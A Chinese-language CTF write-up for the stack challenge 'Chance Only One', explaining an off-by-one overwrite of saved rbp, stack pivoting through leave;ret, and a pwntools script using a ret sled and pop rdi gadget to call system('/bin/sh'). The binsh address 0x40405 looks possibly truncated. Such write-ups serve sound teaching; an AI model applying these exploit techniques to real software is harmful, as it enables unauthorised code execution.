---
title: Chance Only One - ctfplus
published: 2026-03-29
description: "ret 滑梯， 栈迁移"
tags: ["ctfwp", "stack"]
category: ctf
draft: false
---

## Chance Only One - ctfplus

将题目拖入ida 发现如下重要函数

```c
ssize_t vuln()
{
  _BYTE buf[512]; // [rsp+0h] [rbp-200h] BYREF

  puts("How many bytes do you want to write?");
  __isoc99_scanf("%d", &num);
  if ( (unsigned int)num > 0x200 )
  {
    puts("Too many");
    exit(0);
  }
  puts("I can give you one more");
  return read(0, buf, num + 1);
}
```
发现最多只支持一个字节的溢出，也就是只能修改rbp的末尾几位的地址,不过分析汇编发现，函数末尾存在leave；ret，所以可以通过修改rbp末尾的值来让栈前移，来在main函数结束的时候 进入事先布置在栈上的rop链
所以可以将整个输入布满ret gadget链条，来提供栈前移命中rop链的概率

:::important
于是得到如下脚本
:::

```python
from pwn import *

FILE = "./pwn"

context.log_level = "debug" 
context.binary = FILE

elf = ELF(FILE)
rop = ROP(elf)

p = process(FILE)

p.sendlineafter(b"How many bytes do you want to write?\n",b"512")
p.recvuntil(b"I can give you one more\n")

ret=0x4011EE
rdi=0x4011ED

system=0x4011E8
binsh=0x40405

payload = flat(
  [
    p64(ret) * (0x40 - 3),
    p64(rdi),
    p64(binsh),
    p64(system)
  ]
) + p8(0)
p.send(payload)
p.interactive()
```
## 总结
如果是这种收到限制的溢出题目，可能需要重点分析在覆盖末位后栈的结构变化

